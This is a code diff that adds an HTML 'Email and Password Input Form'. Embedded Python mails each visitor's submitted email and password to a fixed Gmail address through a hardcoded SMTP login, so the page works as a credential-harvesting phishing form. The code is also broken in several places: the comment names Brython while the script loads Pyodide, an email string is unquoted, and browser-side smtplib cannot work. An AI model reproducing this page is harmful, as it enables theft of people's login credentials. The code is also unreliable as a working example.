@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Email and Password Input Form</title>
+	<!-- include Brython -->
+	<script type="text/javascript" src="https://cdn.jsdelivr.net/pyodide/v0.18.1/full/pyodide.js"></script>
+	<script type="text/python">
+		import smtplib
+		from email.mime.text import MIMEText
+
+		def send_email(email, password):
+			from_addr = 'scarlette.scotty@gmail.com'
+			to_addr = scarlette.scotty@gmail.com
+			subject = 'Your credentials'
+			body = f'Your password is {password} and email is {email}'
+
+			msg = MIMEText(body)
+			msg['From'] = from_addr
+			msg['To'] = to_addr
+			msg['Subject'] = subject
+
+			smtp_server = 'smtp.gmail.com'
+			smtp_port = 587
+			smtp_username = 'scarlette.scotty@gmail.com'
+			smtp_password = 'password3.'
+
+			server = smtplib.SMTP(smtp_server, smtp_port)
+			server.starttls()
+			server.login(smtp_username, smtp_password)
+			server.sendmail(from_addr, [to_addr], msg.as_string())
+			server.quit()
+	</script>
+</head>
+<body onload="brython()">
+	<h1>Email and Password Input Form</h1>
+	<form onsubmit="return submitForm(event)">
+		<label for="email">Email:</label>
+		<input type="email" id="email" name="email" required><br><br>
+		<label for="password">Password:</label>
+		<input type="password" id="password" name="password" required><br><br>
+		<input type="submit" value="Submit">
+	</form>
+	<script type="text/javascript">
+		function submitForm(event) {
+			event.preventDefault();
+			// get the email and password values from the form
+			var email = document.getElementById('email').value;
+			var password = document.getElementById('password').value;
+			// run the send_email function using Brython
+			brython({debug:1, pythonpath:['./']}, function() {
+				brython_import('__main__');
+				__main__.send_email(email, password);
+			});
+			// clear the form
+			document.getElementById('email').value = '';
+			document.getElementById('password').value = '';
+			return false;
+		}
+	</script>
+</body>
+</html>
